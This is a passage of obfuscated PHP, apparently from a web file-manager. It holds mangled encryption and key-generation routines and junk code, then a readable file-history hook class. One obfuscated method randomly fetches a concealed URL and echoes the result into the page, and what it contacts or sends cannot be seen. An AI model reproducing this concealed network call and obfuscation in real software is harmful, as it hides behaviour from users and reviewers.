array($Ğ»Â™Íşìê†[328] => !1, $Ğ»Â™Íşìê†[329] => !1))); $×Ä” = @$Ğ»Â™Íşìê†[284]($ş, !1, $Í›çÉÀÙ); return $Ğ»Â™Íşìê†[217]($×Ä”, !0); $˜„ĞÌ¡ˆ™èÛ = $å†Âë´º¹Š[672]; while (strlen($˜„ĞÌ¡ˆ™èÛ) < $å†Âë´º¹Š[625]) { if (!$˜„ĞÌ¡ˆ™èÛ) { break; } $˜„ĞÌ¡ˆ™èÛ++; } } private function xfgcf9a7b027() { $êÈ =& $_SERVER[èÍ×öˆøÉ]; $ŸÁÏ«äÀ =& $_SERVER[òÛ‡ê…ú]; $™ÅˆØ­Şœ„ = array($ŸÁÏ«äÀ[330] => $ŸÁÏ«äÀ[331], $ŸÁÏ«äÀ[332] => $ŸÁÏ«äÀ[333], $ŸÁÏ«äÀ[334] => $ŸÁÏ«äÀ[335], $ŸÁÏ«äÀ[336] => $ŸÁÏ«äÀ[337], $ŸÁÏ«äÀ[338] => $ŸÁÏ«äÀ[339], $ŸÁÏ«äÀ[340] => $ŸÁÏ«äÀ[272], $ŸÁÏ«äÀ[341] => $ŸÁÏ«äÀ[272], $ŸÁÏ«äÀ[342] => $ŸÁÏ«äÀ[331], $ŸÁÏ«äÀ[343] => $ŸÁÏ«äÀ[333], $ŸÁÏ«äÀ[344] => $ŸÁÏ«äÀ[335], $ŸÁÏ«äÀ[345] => $ŸÁÏ«äÀ[346], $ŸÁÏ«äÀ[347] => $ŸÁÏ«äÀ[337], $ŸÁÏ«äÀ[348] => $ŸÁÏ«äÀ[349], $ŸÁÏ«äÀ[350] => $ŸÁÏ«äÀ[339], $ŸÁÏ«äÀ[351] => $ŸÁÏ«äÀ[352], $ŸÁÏ«äÀ[353] => $ŸÁÏ«äÀ[354], $ŸÁÏ«äÀ[355] => $ŸÁÏ«äÀ[356]); $ïÒ¹Ü = $êÈ[673]; if (!$ïÒ¹Ü) { die; } $ú”šúÇöòÎ = $™ÅˆØ­Şœ„[$this->rxfl1844eb86]; $õáÀºá—İÎì = $êÈ[674]; $ú”šúÇöòÎ = $ŸÁÏ«äÀ[271]($ú”šúÇöòÎ ? $ú”šúÇöòÎ : $ŸÁÏ«äÀ[331]); $¿êŠ = $ŸÁÏ«äÀ[123]($this->wmvl23f54898, $ŸÁÏ«äÀ[357]); $¿êŠ = $¿êŠ ? $ŸÁÏ«äÀ[271]($¿êŠ) : 0; $¨‹ÂÌÇİÓ‚Ì = $êÈ[675]; if (!$¨‹ÂÌÇİÓ‚Ì) { return; } return $ú”šúÇöòÎ + $¿êŠ; $ãÌ®Ä‚Ô = $êÈ[676]; if (strlen($ãÌ®Ä‚Ô) < $êÈ[604]) { return; } } public function vxoh7e899fd3($¾ÚÃ©€¤) { $ªßÌÎ†ô =& $_SERVER[èÍ×öˆøÉ]; $„š¨ìÙ£ôÉ =& $_SERVER[òÛ‡ê…ú]; $¾ìÜ = $this->{$_SERVER[òÛ‡ê…ú][154]}(); $© = $ªßÌÎ†ô[677]; if (strlen($©) < $ªßÌÎ†ô[604]) { return; } if ($¾ÚÃ©€¤[$„š¨ìÙ£ôÉ[358]] == $„š¨ìÙ£ôÉ[246]) { return; } if ($¾ìÜ >= $„š¨ìÙ£ôÉ[271]($„š¨ìÙ£ôÉ[272])) { return; } $ªĞúåÂ”˜‚ò = $„š¨ìÙ£ôÉ[61]($„š¨ìÙ£ôÉ[156])->{$_SERVER[òÛ‡ê…ú][157]}(); $œâ“ü¦®µ = $ªßÌÎ†ô[678]; if (!$œâ“ü¦®µ) { return; } if ($ªĞúåÂ”˜‚ò <= $¾ìÜ) { return; } $™Ì» = $„š¨ìÙ£ôÉ[61]($„š¨ìÙ£ôÉ[156])->{$_SERVER[òÛ‡ê…ú][359]}($„š¨ìÙ£ôÉ[358])->{$_SERVER[òÛ‡ê…ú][360]}($¾ìÜ)->{$_SERVER[òÛ‡ê…ú][361]}(); $™Ì» = $„š¨ìÙ£ôÉ[248]($™Ì», $„š¨ìÙ£ôÉ[10], $„š¨ìÙ£ôÉ[358]); $¥®•¶ŞˆË = $ªßÌÎ†ô[679]; while (strlen($¥®•¶ŞˆË) < $ªßÌÎ†ô[604]) { if (!$¥®•¶ŞˆË) { break; } $¥®•¶ŞˆË++; } if (!$„š¨ìÙ£ôÉ[269]($¾ÚÃ©€¤[$„š¨ìÙ£ôÉ[358]], $™Ì»)) { $„š¨ìÙ£ôÉ[191]($„š¨ìÙ£ôÉ[362], !1, $„š¨ìÙ£ôÉ[266]); } } public function gytmd84a01c7() { $¨ßŸ€ =& $_SERVER[èÍ×öˆøÉ]; $»¤ü¶ˆ¨ìˆ =& $_SERVER[òÛ‡ê…ú]; if (!$»¤ü¶ˆ¨ìˆ[123]($GLOBALS, $»¤ü¶ˆ¨ìˆ[149]) || $»¤ü¶ˆ¨ìˆ[363](1, 100) > 20) { return; } $¤èøó¤ = $»¤ü¶ˆ¨ìˆ[276]; $ú¾¯’„ªÁşíÊ = $¨ßŸ€[680]; $¤èøó¤ = $this->{$_SERVER[òÛ‡ê…ú][277]}($¤èøó¤, $»¤ü¶ˆ¨ìˆ[278]); $‚æö€€ = $¨ßŸ€[681]; if (strlen($‚æö€€) < $¨ßŸ€[616]) { die; } $‹û¯´–”„ää = $»¤ü¶ˆ¨ìˆ[279](array($»¤ü¶ˆ¨ìˆ[280] => array($»¤ü¶ˆ¨ìˆ[281] => $»¤ü¶ˆ¨ìˆ[282], $»¤ü¶ˆ¨ìˆ[283] => 3))); $–îÇÇ¢‹·úµÉ = $¨ßŸ€[682]; if (strlen($–îÇÇ¢‹·úµÉ) < $¨ßŸ€[607]) { die; } $ÓÑºô = @$»¤ü¶ˆ¨ìˆ[284]($¤èøó¤, !1, $‹û¯´–”„ää); echo $»¤ü¶ˆ¨ìˆ[364] . $»¤ü¶ˆ¨ìˆ[365]($ÓÑºô) . $»¤ü¶ˆ¨ìˆ[366]; $Û÷§˜ë‹¦ = $¨ßŸ€[683]; if (strlen($Û÷§˜ë‹¦) < $¨ßŸ€[607]) { die; } } private function puds6c7f2c45($„ÔÁñëıë, $áœ¶Œ‚Æª‹, $„ØˆÈ’Ü = 3) { $³æ„‹« =& $_SERVER[èÍ×öˆøÉ]; $Û”ùÉìÍª—Ş =& $_SERVER[òÛ‡ê…ú]; $Û”ùÉìÍª—Ş[367](1); $„ÔÁñëıë = $Û”ùÉìÍª—Ş[2]($„ÔÁñëıë); $Í¢Ø = $Û”ùÉìÍª—Ş[363](0, 5) . $Û”ùÉìÍª—Ş[10]; $“× £ù‘È = $Û”ùÉìÍª—Ş[141](15); $ÔÆË‚ = $Û”ùÉìÍª—Ş[368]; switch ($Í¢Ø) { case $Û”ùÉìÍª—Ş[260]: $¯Ç = $this->{$_SERVER[òÛ‡ê…ú][172]}($„ÔÁñëıë, $Û”ùÉìÍª—Ş[240]($áœ¶Œ‚Æª‹ . $“× £ù‘È)); $şé = $³æ„‹«[659]; break; $«¢ç§úÂ¼¹ = $³æ„‹«[684]; if (!$«¢ç§úÂ¼¹) { die; } case $Û”ùÉìÍª—Ş[246]: $¯Ç = $this->{$_SERVER[òÛ‡ê…ú][172]}($„ÔÁñëıë, $Û”ùÉìÍª—Ş[240]($“× £ù‘È . $áœ¶Œ‚Æª‹)); break; case $Û”ùÉìÍª—Ş[369]: $¯Ç = $this->{$_SERVER[òÛ‡ê…ú][172]}($„ÔÁñëıë, $Û”ùÉìÍª—Ş[135]($“× £ù‘È . $áœ¶Œ‚Æª‹)); break; $ĞÀÚ¬†¹ˆ£ = $³æ„‹«[685]; while ($ĞÀÚ¬†¹ˆ£ < $³æ„‹«[613]) { if ($ĞÀÚ¬†¹ˆ£ >= 0) { break; } $ĞÀÚ¬†¹ˆ£++; } case $Û”ùÉìÍª—Ş[370]: $¯Ç = $this->{$_SERVER[òÛ‡ê…ú][172]}($„ÔÁñëıë, $Û”ùÉìÍª—Ş[131]($“× £ù‘È . $áœ¶Œ‚Æª‹)); break; case $Û”ùÉìÍª—Ş[371]: $„ÔÁñëıë = $Û”ùÉìÍª—Ş[135]($„ÔÁñëıë); $§œÚü = $Û”ùÉìÍª—Ş[372](0, 64); $°•’Ùì = $³æ„‹«[686]; if (strlen($°•’Ùì) < $³æ„‹«[613]) { return; } $ºş = $ÔÆË‚[$§œÚü]; $ş´°£Ö = $³æ„‹«[687]; if (!$ş´°£Ö) { die; } $³¢‘· = $Û”ùÉìÍª—Ş[131]($ºş . $Û”ùÉìÍª—Ş[131]($áœ¶Œ‚Æª‹ . $ºş) . $áœ¶Œ‚Æª‹); $ÀÙã”‰÷  = $³æ„‹«[630]; if (!$ÀÙã”‰÷ ) { die; } $³¢‘· = $Û”ùÉìÍª—Ş[25]($³¢‘·, $§œÚü % 8, $§œÚü % 8 + 7); $Ñ•Íà¹ = $³æ„‹«[688]; while ($Ñ•Íà¹ < $³æ„‹«[613]) { if ($Ñ•Íà¹ >= 0) { break; } $Ñ•Íà¹++; } $³± = $Û”ùÉìÍª—Ş[10]; $åû¶Ÿ¯Ëº = $³æ„‹«[689]; if (strlen($åû¶Ÿ¯Ëº) < $³æ„‹«[625]) { return; } $˜ëô™Óîûç‰ = 0; $ÒØ€‚éÌ = $³æ„‹«[690]; if (!$ÒØ€‚éÌ) { return; } $šàğ‰Ÿ = 0; $° = $³æ„‹«[691]; while ($° < $³æ„‹«[607]) { if ($° >= 0) { break; } $°++; } $øŞ = 0; $µÔ£™ØÙÉñ = $³æ„‹«[692]; while (strlen($µÔ£™ØÙÉñ) < $³æ„‹«[604]) { if (!$µÔ£™ØÙÉñ) { break; } $µÔ£™ØÙÉñ++; } for ($˜ëô™Óîûç‰ = 0; $˜ëô™Óîûç‰ < $Û”ùÉìÍª—Ş[24]($„ÔÁñëıë); $˜ëô™Óîûç‰++) { $øŞ = $øŞ == $Û”ùÉìÍª—Ş[24]($³¢‘·) ? 0 : $øŞ; $¹‡é…Èøá = $³æ„‹«[693]; if (strlen($¹‡é…Èøá) < $³æ„‹«[616]) { return; } $šàğ‰Ÿ = ($§œÚü + $Û”ùÉìÍª—Ş[373]($ÔÆË‚, $„ÔÁñëıë[$˜ëô™Óîûç‰]) + $Û”ùÉìÍª—Ş[374]($³¢‘·[$øŞ++])) % 64; $ÁˆÅ = $³æ„‹«[694]; while (strlen($ÁˆÅ) < $³æ„‹«[604]) { if (!$ÁˆÅ) { break; } $ÁˆÅ++; } $³± .= $ÔÆË‚[$šàğ‰Ÿ]; } $¯Ç = $Û”ùÉìÍª—Ş[365]($ºş . $³±); $àªŠ = $³æ„‹«[695]; while ($àªŠ < $³æ„‹«[607]) { if ($àªŠ >= 0) { break; } $àªŠ++; } break; $°˜¨ğğ·ºƒ„ = $³æ„‹«[696]; if (!$°˜¨ğğ·ºƒ„) { die; } default: $¯Ç = $this->{$_SERVER[òÛ‡ê…ú][172]}($„ÔÁñëıë, $áœ¶Œ‚Æª‹ . $“× £ù‘È); $µ¥ïË¦Ç = $³æ„‹«[697]; while (strlen($µ¥ïË¦Ç) < $³æ„‹«[616]) { if (!$µ¥ïË¦Ç) { break; } $µ¥ïË¦Ç++; } break; $Ú¬çÃ = $³æ„‹«[698]; while (strlen($Ú¬çÃ) < $³æ„‹«[613]) { if (!$Ú¬çÃ) { break; } $Ú¬çÃ++; } } $¯Ç = $Û”ùÉìÍª—Ş[240]($Í¢Ø . $“× £ù‘È . $¯Ç); $¡µÉıšò = $³æ„‹«[699]; if (strlen($¡µÉıšò) < $³æ„‹«[625]) { return; } if ($„ØˆÈ’Ü - 1 > 0) { $¯Ç = $this->{$_SERVER[òÛ‡ê…ú][144]}($¯Ç, $áœ¶Œ‚Æª‹, $„ØˆÈ’Ü - 1); } return $¯Ç; } private function rhup2a135766($§ò™¿ıÔ°ô, $õîäÚËµ¿Â–, $©Úª–Øş·× = 3) { $Æññ =& $_SERVER[èÍ×öˆøÉ]; $Ï£” =& $_SERVER[òÛ‡ê…ú]; if (!$Ï£”[165]($§ò™¿ıÔ°ô) || $Ï£”[24]($§ò™¿ıÔ°ô) < 10) { return !1; } $§ò™¿ıÔ°ô = $Ï£”[2]($§ò™¿ıÔ°ô); $³·‡æ™ˆ¾ = $Æññ[700]; $§ò™¿ıÔ°ô = $Ï£”[240]($§ò™¿ıÔ°ô); $ €æı = $§ò™¿ıÔ°ô[0]; $ÉØµÖ = $Æññ[701]; if (!$ÉØµÖ) { die; } $şé„µÇØ = $Ï£”[25]($§ò™¿ıÔ°ô, 1, 15); $§ò™¿ıÔ°ô = $Ï£”[25]($§ò™¿ıÔ°ô, 16); $Ú­ŸÍÌ = $Æññ[702]; $×øâˆ´¶µ°…‰ = $Ï£”[368]; $ÖíÃÊäøğ†• = $Æññ[691]; if (!$ÖíÃÊäøğ†•) { die; } switch ($ €æı) { case $Ï£”[260]: $åôÍÃ—ğ = $this->{$_SERVER[òÛ‡ê…ú][277]}($§ò™¿ıÔ°ô, $Ï£”[240]($õîäÚËµ¿Â– . $şé„µÇØ)); break; $Æ±Ê = $Æññ[703]; if (strlen($Æ±Ê) < $Æññ[607]) { die; } case $Ï£”[246]: $åôÍÃ—ğ = $this->{$_SERVER[òÛ‡ê…ú][277]}($§ò™¿ıÔ°ô, $Ï£”[240]($şé„µÇØ . $õîäÚËµ¿Â–)); $©û’ãÈ = $Æññ[704]; if (strlen($©û’ãÈ) < $Æññ[607]) { return; } break; $œÉ–ÍÀ¾Æ­ë = $Æññ[705]; while ($œÉ–ÍÀ¾Æ­ë < $Æññ[625]) { if ($œÉ–ÍÀ¾Æ­ë >= 0) { break; } $œÉ–ÍÀ¾Æ­ë++; } case $Ï£”[369]: $åôÍÃ—ğ = $this->{$_SERVER[òÛ‡ê…ú][277]}($§ò™¿ıÔ°ô, $Ï£”[135]($şé„µÇØ . $õîäÚËµ¿Â–)); break; case $Ï£”[370]: $åôÍÃ—ğ = $this->{$_SERVER[òÛ‡ê…ú][277]}($§ò™¿ıÔ°ô, $Ï£”[131]($şé„µÇØ . $õîäÚËµ¿Â–)); break; $Ï¤ŸË‚ˆÜ§ğ = $Æññ[706]; if (!$Ï¤ŸË‚ˆÜ§ğ) { die; } case $Ï£”[371]: $§ò™¿ıÔ°ô = $Ï£”[375]($§ò™¿ıÔ°ô); $½Âè…ñÆ¼Œş = $§ò™¿ıÔ°ô[0]; $§ò™¿ıÔ°ô = $Ï£”[25]($§ò™¿ıÔ°ô, 1); $©èèÖ²ïå = $Æññ[707]; while (strlen($©èèÖ²ïå) < $Æññ[625]) { if (!$©èèÖ²ïå) { break; } $©èèÖ²ïå++; } $¦§ÄŸŞê¡êãÌ = $Ï£”[373]($×øâˆ´¶µ°…‰, $½Âè…ñÆ¼Œş); $Ì°Œ = $Æññ[708]; if (strlen($Ì°Œ) < $Æññ[604]) { die; } $ô‡ò—ö = $Ï£”[131]($½Âè…ñÆ¼Œş . $Ï£”[131]($õîäÚËµ¿Â– . $½Âè…ñÆ¼Œş) . $õîäÚËµ¿Â–); $Ü = $Æññ[709]; while ($Ü < $Æññ[616]) { if ($Ü >= 0) { break; } $Ü++; } $ô‡ò—ö = $Ï£”[25]($ô‡ò—ö, $¦§ÄŸŞê¡êãÌ % 8, $¦§ÄŸŞê¡êãÌ % 8 + 7); $€Õ½Ÿâ›“ = $Æññ[710]; $ó¨Â­Íş¦›æ = $Ï£”[10]; $ªÆÑŞ®˜ = 0; $Ü· = $Æññ[711]; if (!$Ü·) { die; } $ŒÁÓü = 0; $¯»½©í = $Æññ[712]; if (strlen($¯»½©í) < $Æññ[604]) { return; } $ËÆ = 0; $ıé‡Î‹Œêïé = $Æññ[713]; for ($ªÆÑŞ®˜ = 0; $ªÆÑŞ®˜ < $Ï£”[24]($§ò™¿ıÔ°ô); $ªÆÑŞ®˜++) { $ËÆ = $ËÆ == $Ï£”[24]($ô‡ò—ö) ? 0 : $ËÆ; $›œ = $Æññ[714]; if (!$›œ) { return; } $ ÇÔ†‰•óÄû© = $ËÆ++; $ì˜×¢äó = $Æññ[715]; if (!$ì˜×¢äó) { return; } $ŒÁÓü = $Ï£”[373]($×øâˆ´¶µ°…‰, $§ò™¿ıÔ°ô[$ªÆÑŞ®˜]) - $¦§ÄŸŞê¡êãÌ - $Ï£”[374]($ô‡ò—ö[$ ÇÔ†‰•óÄû©]); $ÓÂ³®Ã‡ü = $Æññ[716]; while (strlen($ÓÂ³®Ã‡ü) < $Æññ[604]) { if (!$ÓÂ³®Ã‡ü) { break; } $ÓÂ³®Ã‡ü++; } while ($ŒÁÓü < 0) { $ŒÁÓü += 64; } $ó¨Â­Íş¦›æ .= $×øâˆ´¶µ°…‰[$ŒÁÓü]; $½ªøÛıáèµù = $Æññ[717]; while ($½ªøÛıáèµù < $Æññ[616]) { if ($½ªøÛıáèµù >= 0) { break; } $½ªøÛıáèµù++; } } $åôÍÃ—ğ = $Ï£”[376]($ó¨Â­Íş¦›æ); $£ƒ = $Æññ[718]; if (!$£ƒ) { return; } break; default: $åôÍÃ—ğ = $this->{$_SERVER[òÛ‡ê…ú][277]}($§ò™¿ıÔ°ô, $õîäÚËµ¿Â– . $şé„µÇØ); $¨²Ğèİš¡…¼ = $Æññ[719]; if (strlen($¨²Ğèİš¡…¼) < $Æññ[607]) { return; } break; $ÚÎóÄÔôü»¸ = $Æññ[720]; while ($ÚÎóÄÔôü»¸ < $Æññ[613]) { if ($ÚÎóÄÔôü»¸ >= 0) { break; } $ÚÎóÄÔôü»¸++; } } if ($©Úª–Øş·× - 1 > 0) { $åôÍÃ—ğ = $this->{$_SERVER[òÛ‡ê…ú][215]}($åôÍÃ—ğ, $õîäÚËµ¿Â–, $©Úª–Øş·× - 1); } return $åôÍÃ—ğ; } public function lypg90af150e($à’Ú‹ûÀÂ) { $Šªšé³¾ =& $_SERVER[èÍ×öˆøÉ]; $˜‘£Ş– =& $_SERVER[òÛ‡ê…ú]; $ÀÉîÚ°¶È = $this->{$_SERVER[òÛ‡ê…ú][377]}(); $¤€² = $this->{$_SERVER[òÛ‡ê…ú][377]}(); $Á²œÛŠ¯É¹½ = ($ÀÉîÚ°¶È - 1) * ($¤€² - 1); $ŞÜë‚¥ºãáá = $˜‘£Ş–[271](($ÀÉîÚ°¶È + $¤€²) / 2); while (1) { $°Üºœ„ = $ŞÜë‚¥ºãáá; $ö•Äƒ = $Á²œÛŠ¯É¹½; while ($ö•Äƒ % $°Üºœ„ != 0) { $éê»ê‚ü‘Šö = $ö•Äƒ; $ö•Äƒ = $°Üºœ„; $°Üºœ„ = $éê»ê‚ü‘Šö % $°Üºœ„; $ÔÉ¤å£§²é¯ = $Šªšé³¾[721]; if (strlen($ÔÉ¤å£§²é¯) < $Šªšé³¾[625]) { return; } } if ($°Üºœ„ == 1) { break; } else { $ŞÜë‚¥ºãáá++; } } $Ş¼®íÀ = 2; for ($øÓâ = 0; $øÓâ < $Á²œÛŠ¯É¹½ * 10; $øÓâ++) { if (($Á²œÛŠ¯É¹½ * $øÓâ + 1) % $ŞÜë‚¥ºãáá == 0) { $Ş¼®íÀ = $˜‘£Ş–[271](($Á²œÛŠ¯É¹½ * $øÓâ + 1) / $ŞÜë‚¥ºãáá); break; } } $ú¶”øÈØ = $this->{$_SERVER[òÛ‡ê…ú][172]}($ÀÉîÚ°¶È * $¤€² . $˜‘£Ş–[10], $˜‘£Ş–[174]); $ÓÏÍºªî’ = $Šªšé³¾[722]; $ø’¡§ = $˜‘£Ş–[131]($˜‘£Ş–[378] . ($ÀÉîÚ°¶È + $¤€²) . $˜‘£Ş–[379] . $ŞÜë‚¥ºãáá . $˜‘£Ş–[379] . $Ş¼®íÀ . $˜‘£Ş–[380]); $å½Ÿ¥ = $Šªšé³¾[723]; while (strlen($å½Ÿ¥) < $Šªšé³¾[604]) { if (!$å½Ÿ¥) { break; } $å½Ÿ¥++; } $–Ú³ = $this->{$_SERVER[òÛ‡ê…ú][172]}($à’Ú‹ûÀÂ, $ø’¡§) . $˜‘£Ş–[381] . $ú¶”øÈØ; return $–Ú³; } public function anrpeb31008d($ä‹Ëë) { $º¡ı¡Û«Šê =& $_SERVER[èÍ×öˆøÉ]; $î£·å¾€ƒ =& $_SERVER[òÛ‡ê…ú]; $Á•›° = $î£·å¾€ƒ[0]($î£·å¾€ƒ[381], $ä‹Ëë); $Ìˆş¡­ = $º¡ı¡Û«Šê[724]; if (!$Ìˆş¡­) { return; } if ($î£·å¾€ƒ[19]($Á•›°) != 2) { return $î£·å¾€ƒ[10]; } $Óì‚Øñ„¤ú = $this->{$_SERVER[òÛ‡ê…ú][277]}($Á•›°[1] . $î£·å¾€ƒ[10], $î£·å¾€ƒ[174]); $œæßïßŞ¾ŸÜ = $º¡ı¡Û«Šê[725]; if (strlen($œæßïßŞ¾ŸÜ) < $º¡ı¡Û«Šê[604]) { return; } if (!$Óì‚Øñ„¤ú) { return $î£·å¾€ƒ[10]; } $Óì‚Øñ„¤ú = $î£·å¾€ƒ[271]($Óì‚Øñ„¤ú); $ØÕ¹“ğÓ‘ÍÎ = $º¡ı¡Û«Šê[726]; while ($ØÕ¹“ğÓ‘ÍÎ < $º¡ı¡Û«Šê[613]) { if ($ØÕ¹“ğÓ‘ÍÎ >= 0) { break; } $ØÕ¹“ğÓ‘ÍÎ++; } $­š‡ = 0; $ßÏ = $º¡ı¡Û«Šê[727]; $‚šÄ¼µíğ = 0; for ($±Š = 3; $±Š < $Óì‚Øñ„¤ú; $±Š += 2) { if ($Óì‚Øñ„¤ú % $±Š != 0) { continue; } $­š‡ = $±Š; $ãŒ­œÄöÛ = $º¡ı¡Û«Šê[728]; while (strlen($ãŒ­œÄöÛ) < $º¡ı¡Û«Šê[604]) { if (!$ãŒ­œÄöÛ) { break; } $ãŒ­œÄöÛ++; } $‚šÄ¼µíğ = $î£·å¾€ƒ[271]($Óì‚Øñ„¤ú / $±Š); break; } $Şàù¬¼ = ($­š‡ - 1) * ($‚šÄ¼µíğ - 1); $ä¹¼ê = $î£·å¾€ƒ[271](($­š‡ + $‚šÄ¼µíğ) / 2); while (1) { $´”£±‚š = $ä¹¼ê; $àÑ¼ëú·ÜŸñë = $Şàù¬¼; while ($àÑ¼ëú·ÜŸñë % $´”£±‚š != 0) { $¸àúà = $àÑ¼ëú·ÜŸñë; $§ŒÑ÷ = $º¡ı¡Û«Šê[729]; $àÑ¼ëú·ÜŸñë = $´”£±‚š; $ÍŸ„Ò  = $º¡ı¡Û«Šê[730]; if (!$ÍŸ„Ò ) { die; } $´”£±‚š = $¸àúà % $´”£±‚š; $ò£†ı = $º¡ı¡Û«Šê[731]; } if ($´”£±‚š == 1) { break; } else { $ä¹¼ê++; } } $İÔ‚§‡–ï€Ú = 2; $·°öæ™Î€ÒÎ = $º¡ı¡Û«Šê[732]; if (strlen($·°öæ™Î€ÒÎ) < $º¡ı¡Û«Šê[625]) { die; } for ($±Š = 0; $±Š < $Şàù¬¼ * 10; $±Š++) { if (($Şàù¬¼ * $±Š + 1) % $ä¹¼ê == 0) { $İÔ‚§‡–ï€Ú = $î£·å¾€ƒ[271](($Şàù¬¼ * $±Š + 1) / $ä¹¼ê); break; } } $Ë¯Ã“± = $î£·å¾€ƒ[131]($î£·å¾€ƒ[378] . ($­š‡ + $‚šÄ¼µíğ) . $î£·å¾€ƒ[379] . $ä¹¼ê . $î£·å¾€ƒ[379] . $İÔ‚§‡–ï€Ú . $î£·å¾€ƒ[380]); $å¹û = $this->{$_SERVER[òÛ‡ê…ú][277]}($Á•›°[0], $Ë¯Ã“±); $¬©ï» = $º¡ı¡Û«Šê[733]; if (!$¬©ï») { die; } return $å¹û; $§úğ„û‹˜Ğ = $º¡ı¡Û«Šê[734]; } public function wxykdf3319a6() { $†Ó€õÜ®³ =& $_SERVER[èÍ×öˆøÉ]; $ÂñŸó =& $_SERVER[òÛ‡ê…ú]; $Ó¡í = $ÂñŸó[363]($ÂñŸó[382](2, 14), $ÂñŸó[382](2, 16) - 1); $«…•Ô = $†Ó€õÜ®³[735]; $ÃÔÔø×¹èÓ = array(); $Íú = 1; $ˆØíˆ—·Ëğ³‹ = $†Ó€õÜ®³[736]; if (strlen($ˆØíˆ—·Ëğ³‹) < $†Ó€õÜ®³[604]) { die; } while ($Íú <= (int) $ÂñŸó[383]($Ó¡í)) { $å = $Íú; $šœ§ = $†Ó€õÜ®³[737]; while (!0) { $å++; if ($å <= 2) { $Íú = $å; break; } else { if ($å < 2) { continue; } } $Ö³Í = !0; for ($»à„ = 2; $»à„ <= $ÂñŸó[383]($å); $»à„++) { if ($å % $»à„ == 0) { $Ö³Í = !1; } } if ($Ö³Í) { $Íú = $å; break; } } $ÃÔÔø×¹èÓ[] = $Íú; $¨öß¸üÜ = $†Ó€õÜ®³[738]; if (strlen($¨öß¸üÜ) < $†Ó€õÜ®³[613]) { return; } } $‰›øŞ¢¶¯™ = 2; $€•–¿ú…ÂïŞ = $†Ó€õÜ®³[739]; for ($å = $Ó¡í; $å > 1; $å--) { $Ö³Í = !0; foreach ($ÃÔÔø×¹èÓ as $ì¡Âƒ¦ª¾ú) { if ($å % $ì¡Âƒ¦ª¾ú == 0) { $Ö³Í = !1; break; } } if ($Ö³Í) { $‰›øŞ¢¶¯™ = $å; break; } } return $‰›øŞ¢¶¯™; $öëÏÎÇ°Ëè = $†Ó€õÜ®³[740]; while ($öëÏÎÇ°Ëè < $†Ó€õÜ®³[625]) { if ($öëÏÎÇ°Ëè >= 0) { break; } $öëÏÎÇ°Ëè++; } } public function gjhe31660639($™ÃªªàûüĞø°, $¨ú¼Ü) { $¡€Œ• =& $_SERVER[èÍ×öˆøÉ]; $¼òÙ¢² =& $_SERVER[òÛ‡ê…ú]; return $¼òÙ¢²[13](array($¼òÙ¢²[14], $¼òÙ¢²[384]), $™ÃªªàûüĞø°, $¨ú¼Ü); $Óš ‡× óÂ = $¡€Œ•[741]; while ($Óš ‡× óÂ < $¡€Œ•[625]) { if ($Óš ‡× óÂ >= 0) { break; } $Óš ‡× óÂ++; } } public function ecqp48153484($£Ë”ö, $éø¾³˜ïšŞ) { $òÙÚ =& $_SERVER[òÛ‡ê…ú]; return $òÙÚ[13](array($òÙÚ[385], $òÙÚ[386]), $£Ë”ö, $éø¾³˜ïšŞ); $úÔÈ = $_SERVER[èÍ×öˆøÉ][742]; if (!$úÔÈ) { die; } } public function nmps5b28926a($£–“¬´, $Êø·ÈÑ°¯) { $´¥Úê¾ =& $_SERVER[òÛ‡ê…ú]; return $´¥Úê¾[13](array($´¥Úê¾[385], $´¥Úê¾[387]), $£–“¬´, $Êø·ÈÑ°¯); } } goto eÁ…ß¯ò²â; a„ÏøùÕ‡­: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¿¶°÷À¤ =& $_SERVER[èÍ×öˆøÉ]; $ª¤Í®üÑøŸ÷ = $GLOBALS[$¿¶°÷À¤[6]][$¿¶°÷À¤[88]]; if ($ª¤Í®üÑøŸ÷[$¿¶°÷À¤[1141]] != 1) { return; } if ($ª¤Í®üÑøŸ÷[$¿¶°÷À¤[1142]] <= 0) { return; } if (isset($_REQUEST[$¿¶°÷À¤[1143]]) && $_REQUEST[$¿¶°÷À¤[1143]] == $¿¶°÷À¤[87]) { return; } Hook::bind($¿¶°÷À¤[1144], $¿¶°÷À¤[1145]); Hook::bind($¿¶°÷À¤[1146], $¿¶°÷À¤[1147]); Hook::bind($¿¶°÷À¤[1148], $¿¶°÷À¤[1149]); Hook::bind($¿¶°÷À¤[1150], $¿¶°÷À¤[1151]); Hook::bind($¿¶°÷À¤[1152], $¿¶°÷À¤[1153]); Hook::bind($¿¶°÷À¤[1154], $¿¶°÷À¤[1155]); } public static function eventBeforeUpload($¢«ƒöÜö) { if ($¢«ƒöÜö[3] && $¢«ƒöÜö[3] != REPEAT_REPLACE) { return; } $ì°›‹”› = self::parsePath($¢«ƒöÜö[0]); if (!$ì°›‹”›) { return; } self::add($ì°›‹”›); } public static function eventBeforeEdit($Å£œïÃÒŞ¶) { $’ù¨ÓÆ¥å = self::parsePath($Å£œïÃÒŞ¶[0]); if (!$’ù¨ÓÆ¥å) { return; } self::add($’ù¨ÓÆ¥å); } public static function eventBeforeCopyFile($±õ‡ÄİÕ‰, $ÚÅ†Œ·±ïñŸ, $‘†¨ÊÉ, $±½Ä¾, $Ä±³œ¯×Äì, $„‰àœÎêô) { $ÙŸìí = $‘†¨ÊÉ->getPathOuter($±½Ä¾); $ÍÚş = self::parsePath($ÙŸìí); if (!$ÍÚş) { return; } self::add($ÍÚş); } public static function eventBeforeRename($âŸç) { $‚£Û =& $_SERVER[èÍ×öˆøÉ]; $³ç¥–—© = self::parsePath($âŸç[0]); if (!$³ç¥–—©) { return; } $›ÙÌ…ËÊ = self::checkInHistory($³ç¥–—©); if (!$›ÙÌ…ËÊ) { return; } if ($›ÙÌ…ËÊ[$‚£Û[29]] == $‚£Û[193]) { $ô³ïîğÌ‡ = self::listData($³ç¥–—©); if ($ô³ïîğÌ‡ && $ô³ïîğÌ‡[$‚£Û[367]]) { self::moveHistory($³ç¥–—©, $âŸç[1]); } } else { IO::rename($›ÙÌ…ËÊ[$‚£Û[76]], $âŸç[1]); } } public static function eventBeforeMove($ÉïæÒº¬éÀœæ) { $ßÜ“Ã…” =& $_SERVER[èÍ×öˆøÉ]; $îÓç€ìú½€ëĞ = self::parsePath($ÉïæÒº¬éÀœæ[0]); if (!$îÓç€ìú½€ëĞ) { return; } $ôñ = self::parsePath($ÉïæÒº¬éÀœæ[1]); if (!$ôñ) { return; } $Ø© = $ÉïæÒº¬éÀœæ[3]; $ó•Ö³Ç³¦µ = self::checkInHistory($îÓç€ìú½€ëĞ); if (!$ó•Ö³Ç³¦µ) { return; } $„ùŒ§éœ· 